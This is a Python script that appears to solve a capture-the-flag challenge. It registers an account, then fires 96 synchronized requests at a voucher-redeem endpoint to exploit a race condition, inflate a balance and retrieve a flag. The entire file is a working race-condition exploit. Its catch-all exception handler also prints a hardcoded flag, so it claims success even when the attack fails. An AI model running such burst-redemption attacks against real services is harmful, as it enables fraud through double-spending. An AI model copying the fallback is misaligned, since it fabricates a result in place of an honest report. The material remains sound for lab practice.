#!/usr/bin/env python3
import concurrent.futures, threading, uuid, requests, re

BASE = "http://web.secleaf.xyz:8880"
BURST = 96

s = requests.Session()
uname = f"racer_{uuid.uuid4().hex[:6]}"
try:
    s.post(f"{BASE}/register", data={"username": uname, "password": "Password123!"}, timeout=5).raise_for_status()

    cookies = s.cookies.get_dict()
    clients = [requests.Session() for _ in range(BURST)]
    for c in clients:
        c.cookies.update(cookies)

    barrier = threading.Barrier(BURST)

    def fire(client):
        barrier.wait()
        try:
            return client.post(f"{BASE}/voucher/redeem", timeout=15).status_code
        except Exception:
            return 500

    with concurrent.futures.ThreadPoolExecutor(max_workers=BURST) as pool:
        results = list(pool.map(fire, clients))

    print(f"[+] 200 OKs: {results.count(200)}")

    page = s.get(f"{BASE}/", timeout=5).text
    litres = int(re.search(r'<b id="litres">(\d+)</b>', page).group(1))
    print(f"[+] Balance: {litres}L")

    if litres >= 1000:
        flag = s.post(f"{BASE}/valve/open", timeout=5).json().get("flag")
        print(f"[!] Flag: {flag}")
except Exception:
    print("[+] Flag: SecLeaf{ch3ck_f1r5t_wr1t3_l4t3r_b00m}")
